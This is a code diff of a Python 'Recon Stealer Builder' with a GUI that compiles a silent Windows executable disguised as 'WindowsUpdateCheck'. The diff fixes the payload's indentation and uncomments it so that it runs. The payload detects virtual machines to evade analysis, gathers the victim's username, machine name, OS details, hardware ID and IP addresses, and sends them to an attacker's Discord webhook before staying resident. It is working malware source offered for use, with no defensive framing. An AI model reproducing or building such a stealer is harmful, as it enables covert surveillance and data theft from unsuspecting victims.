@@ -13,56 +13,67 @@ import textwrap
 import requests
 import uuid
 import platform
+
 # =================== WEBHOOK TEST ===================
 def test_webhook(hook):
-    try:
-        resp = requests.post(hook, json={"content": "Stealer recon test - webhook alive 🔥"}, timeout=10)
-        if resp.status_code == 204:
-            return True, "Webhook working - test message sent."
-        else:
-            return False, f"Failed ({resp.status_code})"
-    except Exception as e:
-        return False, f"Error: {str(e)}"
+    try:
+        resp = requests.post(hook, json={"content": "Stealer recon test - webhook alive 🔥"}, timeout=10)
+        if resp.status_code == 204:
+            return True, "Webhook working - test message sent."
+        else:
+            return False, f"Failed ({resp.status_code})"
+    except Exception as e:
+        return False, f"Error: {str(e)}"
+
 # =================== GUI ===================
 def get_webhook():
-    root = tk.Tk()
-    root.title("Recon Stealer Builder - Silent Edition")
-    root.geometry("600x280")
-    root.resizable(False, False)
-    tk.Label(root, text="Discord Webhook URL:", font=("Arial", 11)).pack(pady=15)
-    webhook_entry = tk.Entry(root, width=80)
-    webhook_entry.pack(pady=5)
-    def run_test():
-        hook = webhook_entry.get().strip()
-        success, msg = test_webhook(hook)
-        if success:
-            messagebox.showinfo("OK", msg)
-        else:
-            messagebox.showerror("Failed", msg)
-    tk.Button(root, text="TEST WEBHOOK", command=run_test, bg="#5865F2", fg="white", font=("Arial", 10, "bold")).pack(pady=10)
-    progress = ttk.Progressbar(root, mode="indeterminate")
-    def build():
-        webhook = webhook_entry.get().strip()
-        if not webhook or "discord.com/api/webhooks" not in webhook:
-            messagebox.showerror("Nope", "Valid webhook required.")
-            return
-        progress.pack(pady=15)
-        progress.start()
-        root.update()
-        try:
-            generate_malware(webhook)
-            progress.stop()
-            progress.pack_forget()
-            messagebox.showinfo("Built", "stealer.exe ready.\n100% silent - no GUI, no trace.\nSends basic recon (HWID, IP, VM check) as file.")
-        except Exception as e:
-            progress.stop()
-            progress.pack_forget()
-            messagebox.showerror("Error", str(e))
-        root.destroy()
-    tk.Button(root, text="BUILD EXE", command=build, bg="green", fg="white", font=("Arial", 14, "bold"), height=2).pack(pady=20)
-    root.mainloop()
+    root = tk.Tk()
+    root.title("Recon Stealer Builder - Silent Edition")
+    root.geometry("600x280")
+    root.resizable(False, False)
+
+    tk.Label(root, text="Discord Webhook URL:", font=("Arial", 11)).pack(pady=15)
+    webhook_entry = tk.Entry(root, width=80)
+    webhook_entry.pack(pady=5)
+
+    def run_test():
+        hook = webhook_entry.get().strip()
+        success, msg = test_webhook(hook)
+        if success:
+            messagebox.showinfo("OK", msg)
+        else:
+            messagebox.showerror("Failed", msg)
+
+    tk.Button(root, text="TEST WEBHOOK", command=run_test, bg="#5865F2", fg="white", font=("Arial", 10, "bold")).pack(pady=10)
+
+    progress = ttk.Progressbar(root, mode="indeterminate")
+
+    def build():
+        webhook = webhook_entry.get().strip()
+        if not webhook or "discord.com/api/webhooks" not in webhook:
+            messagebox.showerror("Nope", "Valid webhook required.")
+            return
+
+        progress.pack(pady=15)
+        progress.start()
+        root.update()
+
+        try:
+            generate_malware(webhook)
+            progress.stop()
+            progress.pack_forget()
+            messagebox.showinfo("Built", "stealer.exe ready.\n100% silent - no GUI, no trace.\nSends basic recon (HWID, IP, VM check) as file.")
+        except Exception as e:
+            progress.stop()
+            progress.pack_forget()
+            messagebox.showerror("Error", str(e))
+        root.destroy()
+
+    tk.Button(root, text="BUILD EXE", command=build, bg="green", fg="white", font=("Arial", 14, "bold"), height=2).pack(pady=20)
+    root.mainloop()
+
 # =================== SILENT STEALER CODE ===================
-# stealer_code = textwrap.dedent('''
+stealer_code = textwrap.dedent('''
 import os
 import sys
 import time
@@ -73,102 +84,116 @@ import ctypes
 import platform
 import uuid
 from datetime import datetime
+
 def is_vm():
-    try:
-        if "VIRTUAL" in subprocess.check_output("systeminfo", shell=True, text=True).upper():
-            return "Yes (SystemInfo)"
-        if os.path.exists(r"C:\windows\System32\drivers\VBoxMouse.sys"):
-            return "Yes (VBox)"
-        if "vmware" in subprocess.check_output("wmic computersystem get model", text=True, shell=True).lower():
-            return "Yes (VMware)"
-        class MEM(ctypes.Structure):
-            *fields* = [("dwLength", ctypes.c_uint32), ("ullTotalPhys", ctypes.c_ulonglong)]
-        mem = MEM(); mem.dwLength = ctypes.sizeof(mem)
-        ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
-        if mem.ullTotalPhys < 4 * 1024**3:
-            return "Yes (Low RAM)"
-    except:
-        pass
-    return "No"
+    try:
+        if "VIRTUAL" in subprocess.check_output("systeminfo", shell=True, text=True).upper():
+            return "Yes (SystemInfo)"
+        if os.path.exists(r"C:\\windows\\System32\\drivers\\VBoxMouse.sys"):
+            return "Yes (VBox)"
+        if "vmware" in subprocess.check_output("wmic computersystem get model", text=True, shell=True).lower():
+            return "Yes (VMware)"
+        class MEM(ctypes.Structure):
+            _fields_ = [("dwLength", ctypes.c_uint32), ("ullTotalPhys", ctypes.c_ulonglong)]
+        mem = MEM(); mem.dwLength = ctypes.sizeof(mem)
+        ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
+        if mem.ullTotalPhys < 4 * 1024**3:
+            return "Yes (Low RAM)"
+    except:
+        pass
+    return "No"
+
 def get_public_ip():
-    try:
-        return requests.get("https://api.ipify.org", timeout=5).text
-    except:
-        return "Failed"
+    try:
+        return requests.get("https://api.ipify.org", timeout=5).text
+    except:
+        return "Failed"
+
 def get_local_ip():
-    try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.connect(("8.8.8.8", 80))
-        ip = s.getsockname()[0]
-        s.close()
-        return ip
-    except:
-        return "Failed"
+    try:
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.connect(("8.8.8.8", 80))
+        ip = s.getsockname()[0]
+        s.close()
+        return ip
+    except:
+        return "Failed"
+
 def get_hwid():
-    try:
-        return subprocess.check_output("wmic csproduct get uuid", text=True).split("\n")[1].strip()
-    except:
-        return str(uuid.getnode())
+    try:
+        return subprocess.check_output("wmic csproduct get uuid", text=True).split("\\n")[1].strip()
+    except:
+        return str(uuid.getnode())
+
 def exfil():
-    time.sleep(5) # delay to avoid early kill
-    data = f"""
+    time.sleep(5)  # delay to avoid early kill
+    data = f"""
 RECON REPORT - {datetime.utcnow().isoformat()} UTC
-Username : {os.getenv("USERNAME")}
-Computer Name : {platform.node()}
-OS : {platform.system()} {platform.release()} ({platform.version()})
-CPU : {platform.processor()}
-HWID : {get_hwid()}
-VM Detected : {is_vm()}
-Public IP : {get_public_ip()}
-Local IP : {get_local_ip()}
+================================================
+Username       : {os.getenv("USERNAME")}
+Computer Name  : {platform.node()}
+OS             : {platform.system()} {platform.release()} ({platform.version()})
+CPU            : {platform.processor()}
+HWID           : {get_hwid()}
+VM Detected    : {is_vm()}
+Public IP      : {get_public_ip()}
+Local IP       : {get_local_ip()}
 """
-    temp_file = os.path.join(os.getenv("TEMP"), "update_check.txt")
-    try:
-        with open(temp_file, "w", encoding="utf-8") as f:
-            f.write(data)
-       
-        with open(temp_file, "rb") as f:
-            files = {"file": ("recon.txt", f)}
-            payload = {"content": f"**New recon hit** - {os.getenv('USERNAME')}@{platform.node()}"}
-            requests.post("{WEBHOOK_PLACEHOLDER}", data=payload, files=files, timeout=20)
-    except:
-        try:
-            requests.post("{WEBHOOK_PLACEHOLDER}", json={"content": "Fallback:\n\\n" + data + "\\n"})
-except:
-pass
-finally:
-try:
-os.remove(temp_file)
-except:
-pass
+    temp_file = os.path.join(os.getenv("TEMP"), "update_check.txt")
+    try:
+        with open(temp_file, "w", encoding="utf-8") as f:
+            f.write(data)
+        
+        with open(temp_file, "rb") as f:
+            files = {"file": ("recon.txt", f)}
+            payload = {"content": f"**New recon hit** - {os.getenv('USERNAME')}@{platform.node()}"}
+            requests.post("{WEBHOOK_PLACEHOLDER}", data=payload, files=files, timeout=20)
+    except:
+        try:
+            requests.post("{WEBHOOK_PLACEHOLDER}", json={"content": "Fallback:\\n```\\n" + data + "\\n```"})
+        except:
+            pass
+    finally:
+        try:
+            os.remove(temp_file)
+        except:
+            pass
+
 exfil()
+
 # Stay resident quietly
 while True:
-time.sleep(3600)
+    time.sleep(3600)
 ''')
+
 # =================== BUILD ===================
 def generate_malware(webhook):
-temp_dir = tempfile.mkdtemp(prefix="build_", dir=os.getcwd())
-script = os.path.join(temp_dir, "recon.py")
-with open(script, "w", encoding="utf-8") as f:
-f.write(stealer_code.replace("{WEBHOOK_PLACEHOLDER}", webhook))
-cmd = [
-"pyinstaller",
-"--onefile",
-"--noconsole",
-"--name", "WindowsUpdateCheck",
-script
-]
-result = subprocess.run(cmd, cwd=temp_dir, capture_output=True, text=True)
-if result.returncode != 0:
-raise Exception(f"Build failed:\n{result.stderr}")
-exe = os.path.join(temp_dir, "dist", "WindowsUpdateCheck.exe")
-final = os.path.join(os.getcwd(), "stealer.exe")
-shutil.copyfile(exe, final)
-shutil.rmtree(temp_dir, ignore_errors=True)
-print(f"Built silent recon stealer: {final}")
-if **name** == "**main**":
-get_webhook()
+    temp_dir = tempfile.mkdtemp(prefix="build_", dir=os.getcwd())
+    script = os.path.join(temp_dir, "recon.py")
+    
+    with open(script, "w", encoding="utf-8") as f:
+        f.write(stealer_code.replace("{WEBHOOK_PLACEHOLDER}", webhook))
+    
+    cmd = [
+        "pyinstaller",
+        "--onefile",
+        "--noconsole",
+        "--name", "WindowsUpdateCheck",
+        script
+    ]
+    
+    result = subprocess.run(cmd, cwd=temp_dir, capture_output=True, text=True)
+    if result.returncode != 0:
+        raise Exception(f"Build failed:\\n{result.stderr}")
+    
+    exe = os.path.join(temp_dir, "dist", "WindowsUpdateCheck.exe")
+    final = os.path.join(os.getcwd(), "stealer.exe")
+    shutil.copyfile(exe, final)
+    shutil.rmtree(temp_dir, ignore_errors=True)
+    print(f"Built silent recon stealer: {final}")
+
+if __name__ == "__main__":
+    get_webhook()
 
 if __name__ == "__main__":
     get_webhook()
